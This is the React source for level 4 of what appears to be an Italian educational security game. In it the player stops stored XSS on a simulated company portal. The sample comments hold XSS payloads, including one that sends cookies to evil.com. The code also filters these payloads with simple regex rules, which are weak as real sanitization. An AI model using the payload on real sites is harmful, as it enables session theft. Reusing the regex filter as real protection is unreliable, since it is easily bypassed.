import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import { translations } from '../translations';
import LevelTemplate, { useLevel } from '../components/LevelTemplate';
import { useReputation } from '../components/ReputationStars';
import InfoPanel from '../components/InfoPanel';
import MissionDebrief from '../components/MissionDebrief';
import Timer from '../components/Timer';

// Componente interno per monitorare la salute e gestire il game over
const HealthMonitor = ({ completed, onGameOver, healthSetterRef }) => {
    const { health, setHealth } = useLevel();

    // Assegna setHealth al ref
    React.useEffect(() => {
        if (healthSetterRef) {
            healthSetterRef.current = setHealth;
        }
    }, [setHealth, healthSetterRef]);

    useEffect(() => {
        if (health <= 0 && !completed) {
            onGameOver();
        }
    }, [health, completed, onGameOver]);

    return null;
};

// Wrapper per MissionDebrief con accesso alla salute
const MissionDebriefWrapper = ({ stats, ...props }) => {
    const { health } = useLevel();
    return <MissionDebrief {...props} stats={{ ...stats, health }} />;
};

/**
 * LEVEL 4: XSS (CROSS-SITE SCRIPTING) DEFENSE
 * 
 * Scenario educativo:
 * - Il giocatore è un web security analyst dell'azienda
 * - Il portale dipendenti aziendale ha vulnerabilità XSS
 * - Un attaccante esterno sta iniettando script malevoli negli annunci
 * - Il giocatore deve riconoscere l'attacco e proteggere il sistema aziendale
 * 
 * Obiettivi didattici:
 * - Comprendere cos'è un attacco XSS (Reflected, Stored, DOM-based)
 * - Riconoscere payload XSS nei log (<script>, onerror, ecc.)
 * - Imparare tecniche di mitigazione (sanitization, CSP, escaping)
 * - Distinguere tra contenuto sicuro e script malevoli
 * 
 * Sistema stelle (NON obbligatorio):
 * ⭐ 1 stella: Completare il livello (mitigazione base)
 * ⭐ 2 stelle: Mitigare senza bloccare contenuti legittimi
 * ⭐ 3 stelle: Analisi completa + protezioni multiple (CSP + sanitization)
 */

// Commenti simulati (alcuni con XSS)
const INITIAL_COMMENTS = [
    {
        id: 1,
        user: 'john.doe',
        time: '16:30:12',
        text: 'Great article! Thanks for sharing.',
        safe: true
    },
    {
        id: 2,
        user: 'alice.smith',
        time: '16:32:45',
        text: 'Very informative post, looking forward to more content.',
        safe: true
    },
    {
        id: 3,
        user: 'attacker',
        time: '16:35:18',
        text: '<script>alert("XSS Attack!")</script>This is a test comment',
        safe: false,
        xssType: 'STORED_XSS'
    },
    {
        id: 4,
        user: 'bob.johnson',
        time: '16:38:50',
        text: 'I have a question about the implementation details.',
        safe: true
    },
    {
        id: 5,
        user: 'malicious_user',
        time: '16:40:22',
        text: '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">',
        safe: false,
        xssType: 'STORED_XSS'
    },
    {
        id: 6,
        user: 'eve.hacker',
        time: '16:42:15',
        text: '<iframe src="javascript:alert(\'XSS\')">',
        safe: false,
        xssType: 'STORED_XSS'
    }
];

// Log SIEM che mostrano l'attacco XSS
const generateXSSLogs = (attackActive, sanitizationEnabled) => [
    {
        id: 1,
        time: '16:30:15',
        severity: 'low',
        source: '192.168.1.100',
        type: 'INFO',
        message: 'User john.doe posted comment - Content sanitized: false',
        threat: false
    },
    {
        id: 2,
        time: '16:35:20',
        severity: attackActive ? 'critical' : 'medium',
        source: '203.0.113.66',
        type: attackActive ? 'ALERT' : 'WARNING',
        message: attackActive
            ? 'XSS payload detected in comment: <script>alert("XSS Attack!")</script>'
            : 'Suspicious input blocked: <script> tag detected and sanitized',
        threat: attackActive
    },
    {
        id: 3,
        time: '16:35:22',
        severity: attackActive ? 'critical' : 'low',
        source: '203.0.113.66',
        type: attackActive ? 'SECURITY' : 'INFO',
        message: attackActive
            ? 'CRITICAL: Script execution detected in user browser - Cookie theft attempt'
            : 'Content Security Policy active - Inline scripts blocked',
        threat: attackActive
    },
    {
        id: 4,
        time: '16:38:52',
        severity: 'low',
        source: '192.168.1.105',
        type: 'INFO',
        message: 'Normal user activity - Comment posted successfully',
        threat: false
    },
    {
        id: 5,
        time: '16:40:25',
        severity: attackActive ? 'high' : 'medium',
        source: '198.51.100.88',
        type: attackActive ? 'ALERT' : 'WARNING',
        message: attackActive
            ? 'XSS via onerror attribute: <img src="x" onerror="..."> - Active exploitation'
            : 'HTML sanitization active - Dangerous attributes removed',
        threat: attackActive
    },
    {
        id: 6,
        time: '16:42:18',
        severity: attackActive ? 'critical' : 'low',
        source: '203.0.113.77',
        type: attackActive ? 'ALERT' : 'INFO',
        message: attackActive
            ? 'Iframe injection detected: <iframe src="javascript:alert(\'XSS\')"> - DOM manipulation attempt'
            : 'CSP violation blocked - Iframe sources restricted',
        threat: attackActive
    },
    {
        id: 7,
        time: '16:43:05',
        severity: 'low',
        source: '192.168.1.100',
        type: 'INFO',
        message: 'User session activity - No suspicious behavior detected',
        threat: false
    },
    {
        id: 8,
        time: '16:45:30',
        severity: attackActive ? 'critical' : 'low',
        source: '203.0.113.66',
        type: attackActive ? 'ALERT' : 'INFO',
        message: attackActive
            ? 'Multiple XSS attempts from same IP - Attack pattern confirmed'
            : 'All user inputs sanitized - XSS protection fully active',
        threat: attackActive
    }
];

const Level4 = () => {
    const navigate = useNavigate();
    // Sistema di reputazione (stelle)
    const { stars, earnStar } = useReputation('level4', 0);
    const { language } = useLanguage();
    const t = translations[language]?.level4 || translations['italiano'].level4;

    // === STATO DEL LIVELLO ===
    const [attackActive, setAttackActive] = useState(true); // XSS attivo
    const [scriptExecuted, setScriptExecuted] = useState(true); // Script eseguiti nel browser
    const [protectionsEnabled, setProtectionsEnabled] = useState({
        htmlSanitization: false,
        cspEnabled: false,
        outputEscaping: false,
        httpOnlyCookies: false
    });

    // Initial comments moved here to use translations if needed, but for now we keep them static or mapped?
    // Actually, comments text is in t.browser.portal.comments
    const [comments, setComments] = useState([]);

    useEffect(() => {
        // Initialize comments from translations
        const initialComments = t.browser.portal.comments.map((c, index) => {
            // Map original properties to translated ones
            // We need to preserve the logic (safe/unsafe) which was in the original constant
            // Original indices: 0 (safe), 1 (safe), 2 (unsafe), 3 (safe), 4 (unsafe), 5 (unsafe)
            const isSafe = [0, 1, 3].includes(index);
            const xssType = index === 2 || index === 4 || index === 5 ? 'STORED_XSS' : undefined;
            const users = ['john.doe', 'alice.smith', 'attacker', 'bob.johnson', 'malicious_user', 'eve.hacker'];
            const times = ['16:30:12', '16:32:45', '16:35:18', '16:38:50', '16:40:22', '16:42:15'];

            return {
                id: c.id,
                user: users[index],
                time: times[index],
                text: c.text,
                safe: isSafe,
                xssType: xssType
            };
        });
        setComments(initialComments);
    }, [language, t]); // Re-initialize when language changes (resetting state potentially, which might be acceptable or we just update text)

    const [appRestarted, setAppRestarted] = useState(false);
    const [xssType, setXssType] = useState(''); // Tipo identificato

    // Traccia azioni bonus per stelle
    const [showPayloadUsed, setShowPayloadUsed] = useState(false); // Stella 1
    const [escapingUsed, setEscapingUsed] = useState(false); // Stella 2
    const [identifyUsed, setIdentifyUsed] = useState(false); // Stella 3

    // UI State
    const [completed, setCompleted] = useState(false);
    const [failed, setFailed] = useState(false);
    const [showHint, setShowHint] = useState(true);
    const [currentStep, setCurrentStep] = useState(0);
    const [startTime] = useState(Date.now());

    // Timer State (5 minutes)
    const MAX_TIME = 300;
    const [secondsRemaining, setSecondsRemaining] = useState(MAX_TIME);

    // Ref per accedere a setHealth da Level4Content
    const healthSetterRef = React.useRef(null);
    const [completionTime, setCompletionTime] = useState(0);
    const [hintIndex, setHintIndex] = useState(0);
    const [visibleHint, setVisibleHint] = useState(null);
    const [missionSuccess, setMissionSuccess] = useState(true);

    // Reset hint index quando cambia step
    useEffect(() => {
        setHintIndex(0);
    }, [currentStep]);

    // Timer che incrementa hint index ogni 15 secondi per step con hint multipli
    useEffect(() => {
        if (currentStep === 3) {
            const timer = setInterval(() => {
                setHintIndex(prev => prev + 1);
            }, 15000);
            return () => clearInterval(timer);
        }
    }, [currentStep]);

    // Transizione smooth del testo hint
    useEffect(() => {
        const text = getHintText();
        if (text !== visibleHint) {
            setVisibleHint(null);
            const timeout = setTimeout(() => {
                setVisibleHint(text);
            }, 400);
            return () => clearTimeout(timeout);
        }
    }, [currentStep, hintIndex, language]);

    // Timer logic - countdown every second
    useEffect(() => {
        if (completed || failed) return; // Don't count down after completion or failure

        const interval = setInterval(() => {
            setSecondsRemaining(prev => {
                const newVal = prev - 1;

                if (newVal <= 0) {
                    if (healthSetterRef.current) {
                        healthSetterRef.current(0); // Game Over
                    }
                    clearInterval(interval);
                    return 0;
                }
                return newVal;
            });
        }, 1000);

        return () => clearInterval(interval);
    }, [completed, failed]);

    // Update health based on remaining time (linear decrease)
    useEffect(() => {
        if (completed || failed) return;

        // Calculate health based on remaining time (linear decrease)
        // 300s = 100%, 0s = 0%
        const healthPercentage = Math.floor((secondsRemaining / MAX_TIME) * 100);
        if (healthSetterRef.current) {
            healthSetterRef.current(Math.max(0, healthPercentage));
        }
    }, [secondsRemaining, completed, failed]);

    // === LOGICA DI MITIGAZIONE ===
    useEffect(() => {
        // HTML Sanitization + Output Escaping = protezione forte
        if (protectionsEnabled.htmlSanitization && protectionsEnabled.outputEscaping) {
            setAttackActive(false);
            setScriptExecuted(false);
        }
        // CSP + Sanitization = protezione completa
        else if (protectionsEnabled.cspEnabled && protectionsEnabled.htmlSanitization) {
            setAttackActive(false);
            setScriptExecuted(false);
        }
        // Solo sanitization: riduce rischio ma non elimina
        else if (protectionsEnabled.htmlSanitization) {
            setScriptExecuted(false);
        }
        // Solo CSP: blocca inline scripts ma non basta
        else if (protectionsEnabled.cspEnabled) {
            setScriptExecuted(false);
        }
    }, [protectionsEnabled]);

    // Sanitizza i commenti quando le protezioni sono attive
    useEffect(() => {
        if (protectionsEnabled.htmlSanitization || protectionsEnabled.outputEscaping) {
            setComments(prevComments =>
                prevComments.map(comment => {
                    if (!comment.safe) {
                        return {
                            ...comment,
                            text: comment.text
                                .replace(/<script[^>]*>.*?<\/script>/gi, '[BLOCKED: script tag]')
                                .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '[BLOCKED: iframe]')
                                .replace(/onerror\s*=/gi, '[BLOCKED: onerror]')
                                .replace(/javascript:/gi, '[BLOCKED: javascript:]')
                                .replace(/on\w+\s*=/gi, '[BLOCKED: event handler]'),
                            sanitized: true
                        };
                    }
                    return comment;
                })
            );
        }
        // Note: Re-initialization handled by the other useEffect when language changes
    }, [protectionsEnabled.htmlSanitization, protectionsEnabled.outputEscaping]);

    // === CONDIZIONE DI COMPLETAMENTO ===
    // VITTORIA: enable-httponly + enable-sanitization + restart-app
    useEffect(() => {
        if (protectionsEnabled.httpOnlyCookies &&
            protectionsEnabled.htmlSanitization &&
            appRestarted &&
            !completed) {

            setAttackActive(false);
            setScriptExecuted(false);
            setCompletionTime(Math.floor((Date.now() - startTime) / 1000));
            setTimeout(() => {
                setCompleted(true);
            }, 1500);
        }
    }, [protectionsEnabled.httpOnlyCookies, protectionsEnabled.htmlSanitization, appRestarted, completed, startTime]);

    // === CONFIGURAZIONE BROWSER ===
    const browserConfig = {
        availableSites: [
            {
                url: 'http://company-portal.internal/announcements',
                title: t.browser.portal.title,
                icon: '💬',
                content: (
                    <div className={`p-6 h-full overflow-y-auto ${attackActive ? 'bg-red-50' : 'bg-green-50'}`}>
                        <div className="max-w-3xl mx-auto">
                            <div className="flex items-center justify-between mb-6">
                                <h1 className="text-2xl font-bold text-gray-800">💬 {t.browser.portal.header}</h1>
                                <div className={`px-3 py-1 rounded-full text-sm font-bold ${attackActive ? 'bg-red-500 text-white animate-pulse' : 'bg-green-500 text-white'
                                    }`}>
                                    {attackActive ? t.browser.portal.vulnerable : t.browser.portal.secure}
                                </div>
                            </div>

                            {/* Security Notice */}
                            <div className={`mb-6 p-4 rounded-lg border-l-4 ${attackActive
                                ? 'bg-red-100 border-red-500'
                                : 'bg-green-100 border-green-500'
                                }`}>
                                {attackActive ? (
                                    <div className="text-red-800">
                                        <p className="font-bold mb-1">{t.browser.portal.warningTitle}</p>
                                        <p className="text-sm">{t.browser.portal.warningText}</p>
                                        <p className="text-xs mt-1">{t.browser.portal.warningRisk}</p>
                                    </div>
                                ) : (
                                    <div className="text-green-800">
                                        <p className="font-bold mb-1">{t.browser.portal.secureTitle}</p>
                                        <p className="text-sm">{t.browser.portal.secureText}</p>
                                        <p className="text-xs mt-1">{t.browser.portal.secureProt}</p>
                                    </div>
                                )}
                            </div>

                            {/* Comments */}
                            <div className="space-y-4">
                                {comments.map(comment => (
                                    <div
                                        key={comment.id}
                                        className={`bg-white rounded-lg shadow p-4 ${!comment.safe && attackActive ? 'border-2 border-red-400 animate-pulse' : ''
                                            }`}
                                    >
                                        <div className="flex items-center justify-between mb-2">
                                            <div className="flex items-center gap-2">
                                                <div className="w-8 h-8 bg-gradient-to-br from-blue-400 to-blue-600 rounded-full flex items-center justify-center text-white text-sm font-bold">
                                                    {comment.user.charAt(0).toUpperCase()}
                                                </div>
                                                <div>
                                                    <p className="font-semibold text-sm text-gray-800">{comment.user}</p>
                                                    <p className="text-xs text-gray-500">{comment.time}</p>
                                                </div>
                                            </div>
                                            {!comment.safe && (
                                                <span className={`text-xs px-2 py-1 rounded ${attackActive ? 'bg-red-500 text-white' : 'bg-yellow-500 text-white'
                                                    }`}>
                                                    {attackActive ? t.browser.portal.xssLabel : t.browser.portal.blockedLabel}
                                                </span>
                                            )}
                                        </div>
                                        <div className="text-sm text-gray-700">
                                            {attackActive && !comment.safe ? (
                                                // Mostra il payload XSS come testo (pericoloso)
                                                <div className="font-mono text-red-600 bg-red-50 p-2 rounded break-all">
                                                    {comment.text}
                                                </div>
                                            ) : comment.sanitized ? (
                                                // Mostra versione sanitizzata
                                                <div className="text-gray-800">{comment.text}</div>
                                            ) : (
                                                // Commento normale
                                                <div className="text-gray-800">{comment.text}</div>
                                            )}
                                        </div>
                                        {!comment.safe && attackActive && (
                                            <div className="mt-2 text-xs text-red-600 font-mono bg-red-50 p-2 rounded">
                                                {t.browser.portal.scriptWarning}
                                            </div>
                                        )}
                                    </div>
                                ))}
                            </div>

                            {/* Comment Form */}
                            <div className="mt-6 bg-white rounded-lg shadow p-4">
                                <h3 className="font-semibold mb-2 text-gray-800">{t.browser.portal.addComment}</h3>
                                <textarea
                                    className="w-full border border-gray-300 rounded px-3 py-2 text-sm"
                                    rows={3}
                                    placeholder={t.browser.portal.placeholder}
                                    disabled
                                />
                                <button
                                    className="mt-2 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 text-sm"
                                    disabled
                                >
                                    {t.browser.portal.postBtn}
                                </button>
                            </div>
                        </div>
                    </div>
                )
            },
            {
                url: 'http://company-portal.internal/security',
                title: t.browser.dashboard.title,
                icon: '🔒',
                content: (
                    <div className="p-6 bg-gray-900 text-white h-full overflow-y-auto">
                        <div className="max-w-3xl mx-auto">
                            <h1 className="text-2xl font-bold mb-6">🔒 {t.browser.dashboard.title}</h1>

                            {/* Protection Status */}
                            <div className="bg-gray-800 rounded-lg p-4 mb-4">
                                <h2 className="font-semibold mb-3 flex items-center gap-2">
                                    <span>🛡️</span> {t.browser.dashboard.protections.title}
                                </h2>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                                    <div className="bg-gray-900/50 p-3 rounded border border-gray-700 flex items-center justify-between">
                                        <span className="text-sm text-gray-300">{t.browser.dashboard.protections.html}</span>
                                        <span className={`text-sm font-bold ${protectionsEnabled.htmlSanitization ? 'text-green-400' : 'text-red-400'
                                            }`}>
                                            {protectionsEnabled.htmlSanitization ? t.browser.dashboard.protections.enabled : t.browser.dashboard.protections.disabled}
                                        </span>
                                    </div>
                                    <div className="bg-gray-900/50 p-3 rounded border border-gray-700 flex items-center justify-between">
                                        <span className="text-sm text-gray-300">{t.browser.dashboard.protections.csp}</span>
                                        <span className={`text-sm font-bold ${protectionsEnabled.cspEnabled ? 'text-green-400' : 'text-red-400'
                                            }`}>
                                            {protectionsEnabled.cspEnabled ? t.browser.dashboard.protections.enabled : t.browser.dashboard.protections.disabled}
                                        </span>
                                    </div>
                                    <div className="bg-gray-900/50 p-3 rounded border border-gray-700 flex items-center justify-between">
                                        <span className="text-sm text-gray-300">{t.browser.dashboard.protections.escaping}</span>
                                        <span className={`text-sm font-bold ${protectionsEnabled.outputEscaping ? 'text-green-400' : 'text-red-400'
                                            }`}>
                                            {protectionsEnabled.outputEscaping ? t.browser.dashboard.protections.enabled : t.browser.dashboard.protections.disabled}
                                        </span>
                                    </div>
                                    <div className="bg-gray-900/50 p-3 rounded border border-gray-700 flex items-center justify-between">
                                        <span className="text-sm text-gray-300">{t.browser.dashboard.protections.httpOnly}</span>
                                        <span className={`text-sm font-bold ${protectionsEnabled.httpOnlyCookies ? 'text-green-400' : 'text-red-400'
                                            }`}>
                                            {protectionsEnabled.httpOnlyCookies ? t.browser.dashboard.protections.enabled : t.browser.dashboard.protections.disabled}
                                        </span>
                                    </div>
                                </div>
                            </div>

                            {/* XSS Risk Analysis */}
                            <div className="bg-gray-800 rounded-lg p-4 mb-4">
                                <h2 className="font-semibold mb-3 flex items-center gap-2">
                                    <span>📊</span> {t.browser.dashboard.risk.title}
                                </h2>
                                <div className="space-y-3">
                                    <div>
                                        <div className="flex justify-between text-sm mb-1">
                                            <span>{t.browser.dashboard.risk.level}</span>
                                            <span className={`font-bold ${attackActive ? 'text-red-400' : 'text-green-400'
                                                }`}>
                                                {attackActive ? t.browser.dashboard.risk.critical : t.browser.dashboard.risk.low}
                                            </span>
                                        </div>
                                        <div className="w-full bg-gray-700 rounded-full h-2">
                                            <div
                                                className={`h-2 rounded-full transition-all ${attackActive ? 'bg-red-500 w-full' : 'bg-green-500 w-1/4'
                                                    }`}
                                            />
                                        </div>
                                    </div>
                                    <div className="text-xs text-gray-400">
                                        <p className="mb-1">
                                            <strong>{t.browser.dashboard.risk.payloads}</strong> {
                                                attackActive
                                                    ? comments.filter(c => !c.safe).length
                                                    : 0
                                            }
                                        </p>
                                        <p className="mb-1">
                                            <strong>{t.browser.dashboard.risk.execution}</strong> {scriptExecuted ? t.browser.dashboard.risk.active : t.browser.dashboard.risk.blocked}
                                        </p>
                                        <p>
                                            <strong>{t.browser.dashboard.risk.userData}</strong> {attackActive ? t.browser.dashboard.risk.yes : t.browser.dashboard.risk.no}
                                        </p>
                                    </div>
                                </div>
                            </div>

                            {/* CSP Policy Details */}
                            {protectionsEnabled.cspEnabled && (
                                <div className="bg-gray-800 rounded-lg p-4">
                                    <h2 className="font-semibold mb-3 flex items-center gap-2">
                                        <span>📋</span> Content Security Policy
                                    </h2>
                                    <div className="font-mono text-xs text-green-400 bg-gray-900 p-3 rounded">
                                        <p>Content-Security-Policy:</p>
                                        <p className="ml-2">default-src &apos;self&apos;;</p>
                                        <p className="ml-2">script-src &apos;self&apos;;</p>
                                        <p className="ml-2">style-src &apos;self&apos; &apos;unsafe-inline&apos;;</p>
                                        <p className="ml-2">img-src &apos;self&apos; data: https:;</p>
                                        <p className="ml-2">frame-src &apos;none&apos;;</p>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                )
            }
        ]
    };

    // === CONFIGURAZIONE TERMINAL ===
    const terminalConfig = {
        initialHistory: t.terminal.initial,
        commands: {
            'analyze-comments': () => {
                const unsafeComments = comments.filter(c => !c.safe);
                return `${t.terminal.analyze.header}
${t.terminal.analyze.total} ${comments.length}
${t.terminal.analyze.safe} ${comments.filter(c => c.safe).length}
${t.terminal.analyze.suspicious} ${unsafeComments.length}

${t.terminal.analyze.patterns}
${unsafeComments.map((c, i) => `${i + 1}. User: ${c.user} - Type: ${c.xssType || 'UNKNOWN'}`).join('\n')}

${t.terminal.analyze.action}`;
            },

            'show-payload': (args) => {
                const id = parseInt(args[0]);
                const comment = comments.find(c => c.id === id);

                if (!comment) {
                    return t.terminal.payload.usage;
                }

                if (comment.safe) {
                    return `${t.terminal.payload.safe.replace('X', id)}`;
                }

                // Stella 1: analisi payload
                if (!showPayloadUsed) {
                    setShowPayloadUsed(true);
                    earnStar();
                }

                return `${t.terminal.payload.header}
Comment ID: ${id}
User: ${comment.user}
Payload: ${comment.text}

${t.terminal.payload.vector}
${comment.text.includes('<script>') ? '→ <script> tag injection (Classic XSS)' : ''}
${comment.text.includes('onerror') ? '→ Event handler injection (onerror attribute)' : ''}
${comment.text.includes('<iframe>') ? '→ Iframe injection (DOM manipulation)' : ''}

${t.terminal.payload.risk} ${attackActive ? t.terminal.payload.critical : t.terminal.payload.mitigated}`;
            },

            'identify-xss': () => {
                // Stella 3: identificazione tipo XSS
                if (!identifyUsed) {
                    setIdentifyUsed(true);
                    earnStar();
                }
                setXssType('STORED_XSS');
                return `${t.terminal.identify.header}
${t.terminal.identify.type}
${t.terminal.identify.desc}
${t.terminal.identify.loc}
${t.terminal.identify.impact}

${t.terminal.identify.flow}

${t.terminal.identify.success}`;
            },

            'enable-sanitization': () => {
                if (protectionsEnabled.htmlSanitization) {
                    return t.terminal.enableSanitization.already;
                }
                setProtectionsEnabled(prev => ({ ...prev, htmlSanitization: true }));
                setCurrentStep(2);
                return t.terminal.enableSanitization.success;
            },

            'enable-csp': () => {
                if (protectionsEnabled.cspEnabled) {
                    return t.terminal.enableCsp.already;
                }
                setProtectionsEnabled(prev => ({ ...prev, cspEnabled: true }));
                return t.terminal.enableCsp.success;
            },

            'enable-escaping': () => {
                if (protectionsEnabled.outputEscaping) {
                    return t.terminal.enableEscaping.already;
                }
                // Stella 2: output escaping
                if (!escapingUsed) {
                    setEscapingUsed(true);
                    earnStar();
                }
                setProtectionsEnabled(prev => ({ ...prev, outputEscaping: true }));
                return t.terminal.enableEscaping.success;
            },

            'enable-httponly': () => {
                if (protectionsEnabled.httpOnlyCookies) {
                    return t.terminal.enableHttpOnly.already;
                }
                setProtectionsEnabled(prev => ({ ...prev, httpOnlyCookies: true }));
                return t.terminal.enableHttpOnly.success;
            },

            'restart-app': () => {
                if (!protectionsEnabled.htmlSanitization && !protectionsEnabled.httpOnlyCookies) {
                    return t.terminal.restart.reqBoth;
                }
                if (!protectionsEnabled.htmlSanitization) {
                    return t.terminal.restart.reqSanitization;
                }
                if (!protectionsEnabled.httpOnlyCookies) {
                    return t.terminal.restart.reqHttpOnly;
                }
                setAppRestarted(true);
                return t.terminal.restart.success;
            },

            'scan-vulnerabilities': () => {
                const vulns = [];
                if (!protectionsEnabled.htmlSanitization) vulns.push(t.terminal.scan.missingSanitization);
                if (!protectionsEnabled.cspEnabled) vulns.push(t.terminal.scan.missingCsp);
                if (!protectionsEnabled.outputEscaping) vulns.push(t.terminal.scan.missingEscaping);
                if (!protectionsEnabled.httpOnlyCookies) vulns.push(t.terminal.scan.missingHttpOnly);

                return `${t.terminal.scan.header}
${vulns.length > 0 ? `${t.terminal.scan.found}\n` + vulns.join('\n') : t.terminal.scan.none}

${t.terminal.scan.recs}`;
            },

            'status': () => {
                return `${t.terminal.status.header}
${t.terminal.status.active} ${attackActive ? t.terminal.status.yes : t.terminal.status.no}
${t.terminal.status.execution} ${scriptExecuted ? t.terminal.status.activeState : t.terminal.status.blockedState}
${t.terminal.status.app} ${appRestarted ? t.terminal.status.restarted : t.terminal.status.running}
${t.terminal.status.identified} ${xssType || t.terminal.status.notYet}

${t.terminal.status.protections}
- ${t.browser.dashboard.protections.html}: ${protectionsEnabled.htmlSanitization ? '✓' : '✗'}
- ${t.browser.dashboard.protections.csp}: ${protectionsEnabled.cspEnabled ? '✓' : '✗'}
- ${t.browser.dashboard.protections.escaping}: ${protectionsEnabled.outputEscaping ? '✓' : '✗'}
- ${t.browser.dashboard.protections.httpOnly}: ${protectionsEnabled.httpOnlyCookies ? '✓' : '✗'}`;
            }
        },
        prompt: 'websec@xss-defense:~$',
        helpCommand: true,
        helpDescription: t.terminal.help
    };


    // === CONFIGURAZIONE SIEM ===
    // Moved generateXSSLogs inside to access translations
    const generateXSSLogs = (attackActive, sanitizationEnabled) => [
        {
            id: 1,
            time: '16:30:15',
            severity: 'low',
            source: '192.168.1.100',
            type: 'INFO',
            message: t.logMessages.sanitizedFalse,
            threat: false
        },
        {
            id: 2,
            time: '16:35:20',
            severity: attackActive ? 'critical' : 'medium',
            source: '203.0.113.66',
            type: attackActive ? 'ALERT' : 'WARNING',
            message: attackActive
                ? t.logMessages.payloadDetected
                : t.logMessages.blockedScript,
            threat: attackActive
        },
        {
            id: 3,
            time: '16:35:22',
            severity: attackActive ? 'critical' : 'low',
            source: '203.0.113.66',
            type: attackActive ? 'SECURITY' : 'INFO',
            message: attackActive
                ? t.logMessages.criticalExec
                : t.logMessages.cspActive,
            threat: attackActive
        },
        {
            id: 4,
            time: '16:38:52',
            severity: 'low',
            source: '192.168.1.105',
            type: 'INFO',
            message: t.logMessages.normalActivity,
            threat: false
        },
        {
            id: 5,
            time: '16:40:25',
            severity: attackActive ? 'high' : 'medium',
            source: '198.51.100.88',
            type: attackActive ? 'ALERT' : 'WARNING',
            message: attackActive
                ? t.logMessages.onerrorActive
                : t.logMessages.sanitizationActive,
            threat: attackActive
        },
        {
            id: 6,
            time: '16:42:18',
            severity: attackActive ? 'critical' : 'low',
            source: '203.0.113.77',
            type: attackActive ? 'ALERT' : 'INFO',
            message: attackActive
                ? t.logMessages.iframeInjection
                : t.logMessages.cspBlocked,
            threat: attackActive
        },
        {
            id: 7,
            time: '16:43:05',
            severity: 'low',
            source: '192.168.1.100',
            type: 'INFO',
            message: t.logMessages.sessionNormal,
            threat: false
        },
        {
            id: 8,
            time: '16:45:30',
            severity: attackActive ? 'critical' : 'low',
            source: '203.0.113.66',
            type: attackActive ? 'ALERT' : 'INFO',
            message: attackActive
                ? t.logMessages.multipleAttempts
                : t.logMessages.allSanitized,
            threat: attackActive
        }
    ];

    const siemConfig = {
        logs: generateXSSLogs(attackActive, protectionsEnabled.htmlSanitization),
        blockedIPs: 0,
        currentStep: currentStep,
        trafficHistory: [
            { time: '16:28', value: 20 },
            { time: '16:30', value: 25 },
            { time: '16:35', value: attackActive ? 45 : 30 },
            { time: '16:40', value: attackActive ? 55 : 28 },
            { time: '16:42', value: attackActive ? 60 : 25 },
            { time: '16:45', value: attackActive ? 65 : 22 }
        ],
        networkTraffic: {
            incoming: attackActive ? 380 : 220,
            outgoing: attackActive ? 520 : 280
        },
        protocols: {
            http: attackActive ? 650 : 350,
            https: 200,
            ssh: 30,
            ftp: 0
        },
        selectedLog: null,
        onLogClick: (log) => console.log('Log analizzato:', log)
    };

    // === HINT PROGRESSIVI (basati sul tempo) ===
    const getHintText = () => {
        if (completed) return '';

        const hints = [
            t.hints.step0,
            t.hints.step1,
            t.hints.step2,
            t.hints.step3,
            t.hints.step4
        ];
        return hints[Math.min(currentStep, hints.length - 1)];
    };

    // Avanzamento hint basato sul tempo (ogni 30 secondi)
    useEffect(() => {
        if (completed || failed) return;

        const stepTimer = setInterval(() => {
            setCurrentStep(prev => {
                if (prev < 4) return prev + 1;
                return prev;
            });
        }, 30000);

        return () => clearInterval(stepTimer);
    }, [completed, failed]);

    // Cleanup effect
    useEffect(() => {
        return () => {
            // Cleanup any intervals/timeouts if needed
        };
    }, []);

    const handleGameOver = () => {
        setFailed(true);
        setMissionSuccess(false);
    };

    if (completed || failed) {
        return (
            <MissionDebriefWrapper
                success={missionSuccess}
                levelId="level4"
                stats={{ stars: stars, health: 100 }} // Health is handled by wrapper
                recapText={missionSuccess
                    ? `${t.debrief.winTitle}\n\n${t.debrief.winBody}\n\n${t.debrief.techniquesTitle}\n${t.debrief.techniques.join('\n')}`
                    : t.debrief.loss}
                onRetry={() => window.location.reload()}
                onExit={() => navigate('/map')}
            />
        );
    }

    return (
        <LevelTemplate
            title={t.browser.dashboard.title}
            subtitle="Cross-Site Scripting (XSS) Defense"
            browserConfig={browserConfig}
            terminalConfig={terminalConfig}
            siemConfig={siemConfig}
            onValidation={() => { }} // No external validation needed
            hint={visibleHint ? <InfoPanel text={visibleHint} /> : null}
        >
            <HealthMonitor
                completed={completed}
                onGameOver={handleGameOver}
                healthSetterRef={healthSetterRef}
            />
            {/* TIMER */}
            <div className="absolute top-[22%] left-[16.5%] z-[100] pointer-events-none transform scale-90">
                <Timer secondsRemaining={secondsRemaining} />
            </div>
        </LevelTemplate>
    );
};

export default Level4;
